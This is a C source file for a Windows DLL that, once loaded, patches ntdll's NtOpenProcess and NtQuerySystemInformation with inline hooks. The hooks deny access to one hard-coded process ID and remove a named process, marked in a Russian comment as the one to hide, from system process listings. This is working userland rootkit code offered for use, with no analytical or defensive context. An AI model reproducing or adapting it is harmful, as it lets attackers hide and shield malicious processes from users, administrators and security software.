#include <Windows.h>
#include <winternl.h>
typedef NTSTATUS(NTAPI* NtOpenProcess__)(PHANDLE a, ACCESS_MASK b, OBJECT_ATTRIBUTES* c, CLIENT_ID* d);
typedef NTSTATUS(NTAPI* NtQuerySystemInformation__)(ULONG a, PVOID b, ULONG c, PULONG d);

BYTE bytes[] = { 0x51, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x24, 0xC3 };
BYTE oldbytes[] = { 0x51, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x24, 0xC3 };

BYTE bytes2[] = { 0x51, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x24, 0xC3 };
BYTE oldbytes2[] = { 0x51, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x24, 0xC3 };



NTSTATUS origNtOpenProcess(PHANDLE a, ACCESS_MASK b, OBJECT_ATTRIBUTES* c, CLIENT_ID* d)
{
    PVOID address = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
    NtOpenProcess__ NtOpenProcess_ = (NtOpenProcess__)address;


    DWORD oldprotect;
    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), PAGE_EXECUTE_READWRITE, &oldprotect);

    memcpy(address, oldbytes, 16);


    NTSTATUS ret = NtOpenProcess_(a, b, c, d);


    memcpy(address, bytes, sizeof(bytes));

    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), oldprotect, &oldprotect);
    return ret;
}

NTSTATUS hookNtOpenProcess(PHANDLE a, ACCESS_MASK b, OBJECT_ATTRIBUTES* c, CLIENT_ID* d)
{

    if (d->UniqueProcess == (HANDLE)3812)
    {
        return 0xC0000022L;
    }
    return origNtOpenProcess(a, b, c, d);
}

NTSTATUS origNtQuerySystemInformation(ULONG a, PVOID b, ULONG c, PULONG d)
{
    PVOID address = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    NtQuerySystemInformation__ NtQuerySystemInformation_ = (NtQuerySystemInformation__)address;


    DWORD oldprotect;
    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), PAGE_EXECUTE_READWRITE, &oldprotect);

    memcpy(address, oldbytes2, 16);


    NTSTATUS ret = NtQuerySystemInformation_(a, b, c, d);


    memcpy(address, bytes2, sizeof(bytes2));

    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), oldprotect, &oldprotect);
    return ret;
}

NTSTATUS hookNtQuerySystemInformation(ULONG a, PVOID b, ULONG c, PULONG d)
{

    NTSTATUS ret;

    if (a != 5)
    {
        return origNtQuerySystemInformation(a, b, c, d);
    }

    ret = origNtQuerySystemInformation(a, b, c, d);

    PSYSTEM_PROCESS_INFORMATION processCurrent = NULL, processNext = (PSYSTEM_PROCESS_INFORMATION)b;

/// by sqlmapped

    if (NT_SUCCESS(ret))
    {
        processNext = (PSYSTEM_PROCESS_INFORMATION)b;


        while (processNext->NextEntryOffset != 0)
        {

            processCurrent = processNext;

            processNext = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processNext + processNext->NextEntryOffset);

            if (!wcscmp(processNext->ImageName.Buffer, L"explorer.exe"))//процесс который будет скрыт
            {
                if (processNext->NextEntryOffset == 0) processCurrent->NextEntryOffset = 0;
                else
                {
                    processCurrent->NextEntryOffset += processNext->NextEntryOffset;
                }
                processNext = processCurrent;
            }


        }

    }



    return ret;


}

void Hook()
{

    UINT64 func = (UINT64)(&hookNtOpenProcess);
    memcpy(&bytes[0x3], &func, sizeof(PVOID));

    PVOID address = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");

    DWORD oldprotect;
    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), PAGE_EXECUTE_READWRITE, &oldprotect);

    memcpy(oldbytes, address, 16);
    memcpy(address, bytes, sizeof(bytes));

    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), oldprotect, &oldprotect);



    func = (UINT64)(&hookNtQuerySystemInformation);
    memcpy(&bytes2[0x3], &func, sizeof(PVOID));

    address = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), PAGE_EXECUTE_READWRITE, &oldprotect);

    memcpy(oldbytes2, address, 16);
    memcpy(address, bytes2, sizeof(bytes2));

    VirtualProtectEx(GetCurrentProcess(), address, sizeof(address), oldprotect, &oldprotect);



}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        Hook();
    }
    return TRUE;
}
